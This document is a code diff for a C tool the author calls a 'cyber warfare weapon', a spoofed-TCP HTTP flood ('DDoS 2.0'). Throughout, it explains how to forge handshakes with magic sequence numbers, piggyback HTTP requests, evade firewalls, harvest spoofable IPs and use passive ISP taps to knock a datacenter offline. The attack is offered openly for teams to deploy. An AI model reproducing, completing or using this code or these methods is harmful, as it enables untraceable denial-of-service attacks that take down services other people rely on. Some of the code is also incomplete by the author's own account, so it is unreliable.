@@ -2,6 +2,67 @@
 DDoS 2.0 - Merry X-Mas
 This will be ready to go cyber warfare weapon which is fully untracable, and impossible to filter.
 
+The final version seems to function properly.  It is meant as example code to be designed using some passive surveillance systems API.  This single file should give
+enough general overview information for a team to understand, develop, and deploy attack software into their nodes.  I will leave some notes through my own development
+to help with any thought process.  It was performing somewhere around 400k connections a minute for 15k index.html here.  It could, and should be substantially higher.
+I am using a simple laptop running Linux with VMware.  The fact that the client is completely stateless means that most of the bottleneck was directly related to
+server side setup.  If you are performing the attack across multiple web servers, and requesters depending on which is your target then the ceiling shouldnt exist
+unless the boxes are down.  That is the whole point.
+
+How does this attack work:
+1) It creates a network listener for SYN/ACK packets.
+
+2) It takes a list of webservers, and requester IP addresses.  It has to be able to passively monitor at least one sides sequence parameters from TCP/IP.
+
+3) It sends a SYN packet to the web server using a specially generated sequence number.  It will loop for handling this to perform a full on massive attack.
+
+4) The listener thread will receive the SYN/ACK packet looking for a particular range.  If the source port of the HTTP client receiving the SYN/ACK packet
+matches within this range, then it will determine if the magic sequence matches one it may have generated.  If this magic sequence does in fact match then
+it will respond with the final ACK packet, and to speed things up even further it will attach the HTTP request directly to the third packet of the TCP/IP
+handshake.  Notice:  in the future, this is the ONLY way to filter it.  I left the ACK as a separate packet commented out below in the Attack2() function.
+See: (#define) ENABLE_TWO_PACKET_PHASE_2
+
+Why can't this be firewalled?
+
+1) It is similar to how users on the Internet cannot stop people from obtaining their traffic through backbone routes.  The TCP/IP protocol was not built
+to withstand these types of scenarios.  Quantum Insert was built as an attack on this infrastructure to weaponize it for the NSA to infect web browsers
+with viruses.  It takes that same concept, and weaponizes it further where it could be used to generate the biggest attacks nobody has even seen yet
+as of today.  The general approach of opening a TCP/IP connection, and requesting a webpage is so ubiquitous that no firewall in the world could ever
+determine an easy portable way to solve this vulnerability.  It is why the NSA now focuses on Quantum Insert attacks, and claimed 80% success rate as of
+2013 for their targets.  The browsers cannot do anything to stop it as such the web servers cannot in this scenario.
+
+2) The things to change if you know people have firewalled this attack would be the magic sequence algorithm, source port, and enable the extra TCP/IP
+handshake packet without data.(ENABLE_TWO_PACKET_PHASE_2)  The rest is so 'normal' that it'll be an issue as long as TCP/IP as a protocol is being used
+globally.
+
+Other things to consider.
+
+1) RST packets get sent from a client to the web server if it receives a SYN/ACK that it didn't initiate a connecction for.  It will close the connection
+on the web server.  The connection will be dropped sometimes before the entire request gets returned.  It is possible it will have processed some, or
+all of the data.  I was seeinng 40% rate locally.  Locally means the RST was arriving immediately, although the data transfer should have been higher
+as well.  The next thing matters in these cases.  In countries where the monitoring systems are also firewalls then you can filter out these RST packets
+for your ranges of source ports as you attack, or you can implement the full blown magic sequence verification if you have a good team of developers.
+
+2) TCP/IP options and PSH/SACK are used to increase overall transmission speed on the Internet.  It allows a web server to send a large buffer as multiple
+fragmented packets without waiting for the ACK packets of each individual packet.  It allowed Google to send me 15k without any verification whatsoever.
+I am just using the main root directory in my web request.  It is extremely simple to find web URLs which will have much higher content length than 15k.
+
+I created two source files for these 2 things: cyberwar_findips.c (checks for RST responses), and cyberwar_checkpsh.c (checks if a host uses PSH, incomplete)
+
+3) HTTP Flooders either use SYN option, or request a web page.  This is a different kind of attack here as well.  It will keep open connections in the kernel
+sort of in limbo becuase it is further than a SYN into the TCP/IP stack after it requests the data, and it suddenly stops processing the TCP/IP states.  The
+web server will use its maximum TCP/IP timeout interval attempting to solve these issues.  It will happen for every connection.  It is not something I have
+personally seen public yet.
+
+
+Any of my code that is incomplete still has the full blown concepts, and ideas.  I just didn't have a chance to test them thoroughly.
+
+
+I will attempt to complete a PDF explaining the attack.  I want to release this before X-Mas so if it doesn't arrive with it today, then it will come
+tomorrow.
+
+Older notes:
+
 The point of this is to go from 30,000 connections a minute to as many as possible.  I will attempt to make this as small and concise as possible... I'd like it to be
 modular enough to work diretly in routers.  It can have the option branching off the packet sending to other boxes keeping things minimum on routers, and it should
 work fine.
@@ -12,7 +73,7 @@ example:
 Seq (or ACK if remote side) increases by the size, and on some TCP/IP flags by one.. the same request will affect the SEQ by the same amount if done equally...
 the remote side will send back a full response, and even further packets  regardless of receiving anymore proper SEQs so if the remote side has somme dynamic scrits
 such as PHP, etc.. and its SEQ cannot be foreseen.. its already too late and the damage is done.  This is why only a SINGLE SEQ (initial) is required.  The burden
-is decreased greatly because of this.  Quantum inserts entire framework could be weaponized worldwide immediately today due to their infrastructure already beign in
+is decreased greatly because of this.  Quantum Insert's entire framework could be weaponized worldwide immediately today due to their infrastructure already being in
 place, etc.
 
 Do not fear.  A lot of other companies, ISPs, etc all have networks with passive monitoring that you can hack so you can be a world class cyber warrior as well.
@@ -98,6 +159,88 @@ and it can automamtically find the route/device which it would work with.. and w
 it can try the attack while monitoring to determine if itll be reachable/work, and advance to the next
 
 */
+/*
+Overview of TCP/IP connection for web request:
+1: SYN seq:0 ack:0
+
+This is the ONLY packet we care about... the rest is calculated.  
+2: SYN,ACK seq:0 ack:1
+
+3: ACK seq:1 ack:1
+4: Request (GET / fjdofjofjd)  ack:1 seq:1
+
+3 & 4 are both ours, and possibly can be turned into a single PACKET.. but always can be a single transmission.. ill check into single packet but for now who cares
+maybe  not if the tcp/ip protocols dont process it the same until its literallly activated
+--- everything below is irrelevant --
+5: ACK
+6: DATA 200 OK...
+7: DATA1 <HTML>
+8: DATA2 .... 
+etc..etc... 
+.....
+15:PSH,FIN,ACK </HTML>
+16:FIN,ACK
+17:ACK
+--- end of connection
+
+As you can see.. the first four packets are the only which matter.  The rest are irrelevant, and actually... The 3rd, and 4th can be sent practically
+together.  The good thing about this is... we only have to process a single source port one time per connection.  The limitation of not closing connections
+properly is that if we are attacking using some service such as google then there is a 5 minute timeout for all 65535 ports.. not a huge limitation. I doubt
+it'l eever matter since this is just a SINGLE web server when we can target many many more.  If done properly, and timed correctly
+we can pick and choose our source ports, and sequence numbers for our side by timing (literally time(0)) because this means we will completely ignore
+all future packets fromm connections we are establishing without ever processing it purely by a simple checksum, and the timing.. in reality
+if we only allow things that match the current time (if we limit it to 1.5-2 seconds) then nothing beyond that window will even reach our code.
+
+This is a substantial speed increase from my virtual tcp/ip stack which required verifying everything.  I hope I can test it on a local vmware tomorrow...
+
+epoch  can be virtualized and  modulated by years, then months/weeks, days, and then hours, minutes and into seconds.. then we can create tcp/ip slices (windows)
+and generate our SEQs using this so that whenever the target web servers respond we then generate immediately the 2 packets  its expecting... the remote side should
+process them in order and worse case we put a small delay on the outgoing queue but we never allow those same SEQ, or source port for the next slice..
+therefore the  algorothm is constantly choosing/changing
+
+this is the fastest i ve comme up with somme far to handle this situation
+
+*since algo complete.. i removed notes containing gibberish
+
+thats the whole application right here..
+time to finish code, clean it up.. and also attempt to find main routers onlines code so i can integrate it or at least have a practically ready to go system
+for anyone to begin testing...
+
+trust me.. it works.
+
+return 1;
+
+for pre-generation attack packeets ahead of time (so we can queue with different processors, or cards, or boxes to distribute them out)
+instead of using queue with timers.. and  loops.. we can put the delay till the next packet, or section directly into the array itself
+so its a single stream (but must test output buffer ability)
+
+
+time slices of a single second should be fine for the entire operation... any host that are slower we probably wont use for attacks, although it may be plausible
+to increase time slice over time depending on amount of IPs being pushed to the web server
+*/
+
+// to find either web servers which respond in an area for targeting some IP...
+// so it goes liek this: we need to choose some IP we have access to for either attacking, or receiving the attack
+// either side needs to be on one side of the passive tap
+// if we are at a big backbone somewhere, or an ISP router then we can use virtually all traffic without being directly inside of boxes in that network...
+// up to the services we are spoofing (http is most effective for this right now for this example) but is limited by X connections per server
+// we can always just find more IPs that pass through the router...passive monitors which employ quantum insert could essentially
+// manipulate, and give that SEQ (one single packet we need to perform the spoofed HTTP request) for a lot of IPs
+
+// okk so lets say you want to attack some datacenter in miami to knock some service offline..
+// takke the range, and scan with it to a  webserver under your control.. the scan shoudl spoof packets fromm that service, and you should be under control of a router
+// either around the web servers your spoofing the connection to, or near the place your attacking (either way is untracable)
+// as long as you can get that single SEQ you are good to go for but this we need to find dead IPs which will not respond with RST whenever they receive packets
+// foro things they have not had anything to do with
+// so for now the whole concept is TO send them  SYN/ACK packets and monitor for their RST to gather IPs under their ranges which are acceptable spoofing IPs
+// without having to worry about another mechanism i use
+// it does mean that a form of quick protection is to respond with RST, but you could also include a firewall in the rouuters passing the traffic to filter this
+// by specific SEQ/source ports which will not be passed through
+// once you have the IP list.. then those aree the IPs you rotate for this attack.. and depending  on where you are located to get the SEQ
+// you can rotate web servers as well (unless you are  only monitoring an isp with  major web traffic then you have  to pick ranges on their network specifically)
+// to the web traffic itll look like real requests fromm the clients, and  to them they'll see the packets comming  back and not understand why initially
+// the person receiving the transmissions will assume they are  being hacked.. nobody will really knnow whats going on .. for awhile anyways
+// manipulate TTL to push concepts away fromm the routers
 
 #include <stdio.h>
 #include <stdlib.h>
@@ -129,7 +272,7 @@ it can try the attack while monitoring to determine if itll be reachable/work, a
 #include <math.h>
 #include "cyberwarfare.h"
 
-
+// default range: 6000 - 65000
 int range = 60000;
 
 // the seq is split up by bits to contain information to help us determine whether it was generated by us
@@ -240,115 +383,6 @@ PacketBuildInstructions *CW_BasePacket(uint32_t src, int src_port, uint32_t dst,
 }
 
 
-
-
-/*
-1: SYN seq:0 ack:0
-
-This is the ONLY packet we care about... the rest is calculated.  
-2: SYN,ACK seq:0 ack:1
-
-3: ACK seq:1 ack:1
-4: Request (GET / fjdofjofjd)  ack:1 seq:1
-
-3 & 4 are both ours, and possibly can be turned into a single PACKET.. but always can be a single transmission.. ill check into single packet but for now who cares
-maybe  not if the tcp/ip protocols dont process it the same until its literallly activated
---- everything below is irrelevant --
-5: ACK
-6: DATA 200 OK...
-7: DATA1 <HTML>
-8: DATA2 .... 
-etc..etc... 
-.....
-15:PSH,FIN,ACK </HTML>
-16:FIN,ACK
-17:ACK
---- end of connection
-
-As you can see.. the first four packets are the only which matter.  The rest are irrelevant, and actually... The 3rd, and 4th can be sent practically
-together.  The good thing about this is... we only have to process a single source port one time per connection.  The limitation of not closing connections
-properly is that if we are attacking using some service such as google then there is a 5 minute timeout for all 65535 ports.. not a huge limitation. I doubt
-it'l eever matter since this is just a SINGLE web server when we can target many many more.  If done properly, and timed correctly
-we can pick and choose our source ports, and sequence numbers for our side by timing (literally time(0)) because this means we will completely ignore
-all future packets fromm connections we are establishing without ever processing it purely by a simple checksum, and the timing.. in reality
-if we only allow things that match the current time (if we limit it to 1.5-2 seconds) then nothing beyond that window will even reach our code.
-
-This is a substantial speed increase from my virtual tcp/ip stack which required verifying everything.  I hope I can test it on a local vmware tomorrow...
-
-epoch  can be virtualized and  modulated by years, then months/weeks, days, and then hours, minutes and into seconds.. then we can create tcp/ip slices (windows)
-and generate our SEQs using this so that whenever the target web servers respond we then generate immediately the 2 packets  its expecting... the remote side should
-process them in order and worse case we put a small delay on the outgoing queue but we never allow those same SEQ, or source port for the next slice..
-therefore the  algorothm is constantly choosing/changing
-
-this is the fastest i ve comme up with somme far to handle this situation
-
-4 bits = var 1 (secs/2)
-4 bits = secs 5 2 (time slice in minute)
-8 bits = ip modular (% 65535)
-16 bits = source port+checksum
-
-souurce port > 32000 (to cut 16 bits into 8)  (can swap between high/low every few minutes).. or can use % 2 (to mix up high/low in between)
-src port > 0x0000ffff
-
-checksum = a+b * src
-
-// algorithm for seq (ver 1)
-seq = [4 bits:var_1][4 bits:var_2][8 bits: ip % 0xffff][4:src - 0xffff0000][4: (var_1+var_2*(src&0x0000ffff))]
-
-thats the whole application right here..
-time to finish code, clean it up.. and also attempt to find main routers onlines code so i can integrate it or at least have a practically ready to go system
-for anyone to begin testing...
-
-trust me.. it works.
-
-int filter_packet(PacketBuildInstructions *iptr) {
-
-    seq_<bits><a-e>
-unsigned char seq_4a = secs / 2;
-unsigned char seq_4b = secs % 2;
-unsigned short seq_8c = iptr->source % 0xfffff;
-unsigned short seq_8d = (iptr->source_port & 0x0000fffff);
-unsigned short checksum = (seq_4a+seq_4b)*(seq_8d&0x0000fffff);
-unsigned short seq_8e = checksum;
-
-if (iptr->source_port < 0xffff) return 0;
-
-
-return 1;
-
-for pre-generation attack packeets ahead of time (so we can queue with different processors, or cards, or boxes to distribute them out)
-instead of using queue with timers.. and  loops.. we can put the delay till the next packet, or section directly into the array itself
-so its a single stream (but must test output buffer ability)
-
-
-time slices of a single second should be fine for the entire operation... any host that are slower we probably wont use for attacks, although it may be plausible
-to increase time slice over time depending on amount of IPs being pushed to the web server
-*/
-
-// to find either web servers which respond in an area for targeting some IP...
-// so it goes liek this: we need to choose some IP we have access to for either attacking, or receiving the attack
-// either side needs to be on one side of the passive tap
-// if we are at a big backbone somewhere, or an ISP router then we can use virtually all traffic without being directly inside of boxes in that network...
-// up to the services we are spoofing (http is most effective for this right now for this example) but is limited by X connections per server
-// we can always just find more IPs that pass through the router...passive monitors which employ quantum insert could essentially
-// manipulate, and give that SEQ (one single packet we need to perform the spoofed HTTP request) for a lot of IPs
-
-// okk so leets say you want to attack some datacenter in miami to knock some service offline..
-// takke the range, and scan with it to a  webserver under your control.. the scan shoudl spoof packets fromm that service, and you should be under control of a router
-// either around the web servers your spoofing the connection to, or near the place your attacking (either way is untracable)
-// as long as you can get that single SEQ you are good to go for but this we need to find dead IPs which will not respond with RST whenever they receive packets
-// foro things they have not had anything to do with
-// so for now the whole concept is TO send them  SYN/ACK packets and monitor for their RST to gather IPs under their ranges which are acceptable spoofing IPs
-// without having to worry about another mechanism i use
-// it does mean that a form of quick protection is to respond with RST, but you could also include a firewall in the rouuters passing the traffic to filter this
-// by specific SEQ/source ports which will not be passed through
-// once you have the IP list.. then those aree the IPs you rotate for this attack.. and depending  on where you are located to get the SEQ
-// you can rotate web servers as well (unless you are  only monitoring an isp with  major web traffic then you have  to pick ranges on their network specifically)
-// to the web traffic itll look like real requests fromm the clients, and  to them they'll see the packets comming  back and not understand why initially
-// the person receiving the transmissions will assume they are  being hacked.. nobody will really knnow whats going on .. for awhile anyways
-// manipulate TTL to push concepts away fromm the routers
-
-
 // for now we will use my network.c but it should be easy to modify incoming to receive all packets which match a criteria later...
 int Cyberwarefare_DDoS_Init(AS_context *ctx) {
     int ret = -1;
@@ -386,19 +420,20 @@ int Cyberwarfare_SendAttack1(AS_context *ctx, uint32_t src, uint32_t dst, int ts
     PacketBuildInstructions *bptr = NULL;
     int src_port = range + rand()%5000;
     
-    // build magic SEQ so we dont have to keep track of connections.. (golden for executing this attack from massive gbps routers)
-    packet_filter(0, src, src_port, ts, &magic_seq);
-
     // build packet for opening connection to initiate the attack
     bptr = CW_BasePacket(src, src_port, dst, 80, TCP_FLAG_SYN|TCP_OPTIONS|TCP_OPTIONS_TIMESTAMP|TCP_OPTIONS_WINDOW);
 
     if (bptr) {
+        // build magic SEQ so we dont have to keep track of connections.. (golden for executing this attack from massive gbps routers)
+        packet_filter(0, src, src_port, ts, &magic_seq);
+
         bptr->seq = magic_seq;
         bptr->ack = 0;
         bptr->header_identifier = rand()%0xffffffff;
 
         NetworkQueueInstructions(ctx, bptr, optr);
 
+        // calling function will perform this task
         //if (optr) OutgoingQueueLink(ctx, optr);
 
         PacketBuildInstructionsFree(&bptr);
@@ -421,13 +456,7 @@ int Cyberwarfare_SendAttack2(AS_context *ctx, PacketBuildInstructions *iptr) {
     char req_data[] = "GET / HTTP/1.0\r\n\r\n";
     int req_data_size = sizeof(req_data);
 
-/*
-
-    // WOW.. at it goes you dont even need 2 packets to perform the attack.. just a single.. ACK+Request in same packet is enough.
-
-    // SEQ analysis of products may allow these attackss to take place with only a few initial connections to load balancers..
-    // thus allowing using any load balancers of the same types to produce attacks.. not sure how acccurate.. depending on their initial seq
-    
+#ifdef ENABLE_TWO_PACKET_PHASE_2
     
     // build ACK for the servers SYN|ACK
     bptr = CW_BasePacket(iptr->destination_ip, iptr->destination_port, iptr->source_ip, iptr->source_port, TCP_FLAG_ACK|TCP_OPTIONS|TCP_OPTIONS_TIMESTAMP|TCP_OPTIONS_WINDOW);
@@ -441,7 +470,7 @@ int Cyberwarfare_SendAttack2(AS_context *ctx, PacketBuildInstructions *iptr) {
 
     // free first packet
     PacketBuildInstructionsFree(bptr);
-*/
+#endif
     // now build packet for http request (GET .....)
     bptr = CW_BasePacket(iptr->destination_ip, iptr->destination_port, iptr->source_ip, iptr->source_port, TCP_FLAG_ACK|TCP_OPTIONS|TCP_OPTIONS_TIMESTAMP|TCP_OPTIONS_WINDOW);
     if (!bptr) return 0;    
@@ -515,10 +544,6 @@ void start_attack(AS_context *ctx) {
                         OutgoingQueueLink(ctx, optr);
                         AS_perform(ctx);
 
-                        // this SHOULDNT add too much overhead.. since it only processes whats waiting (not reading for more)...
-                        // ill test somme more without it and  see if it hurts/helps
-                        //network_process_incoming_buffer(ctx);
-
                         optr = NULL;
                         //out_count = 0;
                     }
@@ -539,9 +564,13 @@ void start_attack(AS_context *ctx) {
         }
 
         AS_perform(ctx);
+
+        // added a second call to this outside of AS_perform() to increase speed
+        // since its a different thread... maybe irrelevant.. oh well
         network_process_incoming_buffer(ctx);
 
         // this has to be adjusted.. a better system to limit needs to be in place.. not yet
+        // it can be a controlling factor... up to you
         if (!(count++ % 500)) skip = 5;
         //sleep(10);
     }
